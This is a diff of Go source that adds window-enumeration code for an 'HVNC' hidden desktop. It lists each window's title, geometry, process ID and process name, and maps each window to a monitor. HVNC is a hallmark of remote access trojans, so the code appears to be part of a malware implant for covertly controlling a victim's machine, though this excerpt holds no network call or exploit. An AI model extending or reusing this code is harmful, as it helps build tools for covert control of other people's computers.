@@ -1967,3 +1967,161 @@ func minInt(a, b int) int {
 	}
 	return b
 }
+
+var (
+	procGetWindowTextW    = user32.NewProc("GetWindowTextW")
+	procGetWindowTextLenW = user32.NewProc("GetWindowTextLengthW")
+)
+
+type HVNCWindowInfo struct {
+	HWND        uintptr
+	Title       string
+	X           int
+	Y           int
+	Width       int
+	Height      int
+	PID         uint32
+	ProcessName string
+	Monitor     int // -1 if not on any known monitor
+	Visible     bool
+}
+
+func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
+	hvncDesktopMu.Lock()
+	deskHandle := hvncDesktopHandle
+	hvncDesktopMu.Unlock()
+	if deskHandle == 0 {
+		return nil, nil
+	}
+
+	mons := monitorList()
+	monInfos := make([]HVNCMonitorInfo, len(mons))
+	for i, m := range mons {
+		monInfos[i] = HVNCMonitorInfo{
+			Index:   i,
+			Name:    m.name,
+			X:       m.rect.Min.X,
+			Y:       m.rect.Min.Y,
+			Width:   m.rect.Dx(),
+			Height:  m.rect.Dy(),
+			Primary: m.primary,
+		}
+	}
+
+	type rawWin struct {
+		hwnd uintptr
+	}
+	var windows []rawWin
+
+	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
+		windows = append(windows, rawWin{hwnd: hwnd})
+		return 1
+	})
+	procEnumDesktopWindows.Call(deskHandle, cb, 0)
+
+	var result []HVNCWindowInfo
+	for _, w := range windows {
+		if !isWindowVisible(w.hwnd) {
+			continue
+		}
+		var r rect
+		ok, _, _ := procGetWindowRect.Call(w.hwnd, uintptr(unsafe.Pointer(&r)))
+		if ok == 0 {
+			continue
+		}
+		winW := int(r.right - r.left)
+		winH := int(r.bottom - r.top)
+		if winW <= 0 || winH <= 0 {
+			continue
+		}
+
+		title := getWindowText(w.hwnd)
+		if title == "" {
+			continue
+		}
+
+		var pid uint32
+		procGetWindowThreadProcessId.Call(w.hwnd, uintptr(unsafe.Pointer(&pid)))
+
+		procName := ""
+		if pid != 0 {
+			procName = getProcessName(pid)
+		}
+
+		winLeft := int(r.left)
+		winTop := int(r.top)
+		monIdx := -1
+		bestOverlap := 0
+		for i, m := range mons {
+			overlapLeft := maxInt(winLeft, m.rect.Min.X)
+			overlapTop := maxInt(winTop, m.rect.Min.Y)
+			overlapRight := minInt(winLeft+winW, m.rect.Max.X)
+			overlapBottom := minInt(winTop+winH, m.rect.Max.Y)
+			if overlapRight > overlapLeft && overlapBottom > overlapTop {
+				area := (overlapRight - overlapLeft) * (overlapBottom - overlapTop)
+				if area > bestOverlap {
+					bestOverlap = area
+					monIdx = i
+				}
+			}
+		}
+
+		result = append(result, HVNCWindowInfo{
+			HWND:        w.hwnd,
+			Title:       title,
+			X:           winLeft,
+			Y:           winTop,
+			Width:       winW,
+			Height:      winH,
+			PID:         pid,
+			ProcessName: procName,
+			Monitor:     monIdx,
+			Visible:     true,
+		})
+	}
+	return result, monInfos
+}
+
+type HVNCMonitorInfo struct {
+	Index   int
+	Name    string
+	X       int
+	Y       int
+	Width   int
+	Height  int
+	Primary bool
+}
+
+func getWindowText(hwnd uintptr) string {
+	length, _, _ := procGetWindowTextLenW.Call(hwnd)
+	if length == 0 {
+		return ""
+	}
+	buf := make([]uint16, length+1)
+	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(length+1))
+	return syscall.UTF16ToString(buf)
+}
+
+func getProcessName(pid uint32) string {
+	const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+	hProc, _, _ := procOpenProcess.Call(PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid))
+	if hProc == 0 {
+		return ""
+	}
+	defer procCloseHandle.Call(hProc)
+	var buf [260]uint16
+	size := uint32(len(buf))
+	ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
+		hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
+	)
+	if ret == 0 {
+		return ""
+	}
+	fullPath := syscall.UTF16ToString(buf[:size])
+	for i := len(fullPath) - 1; i >= 0; i-- {
+		if fullPath[i] == '\\' || fullPath[i] == '/' {
+			return fullPath[i+1:]
+		}
+	}
+	return fullPath
+}
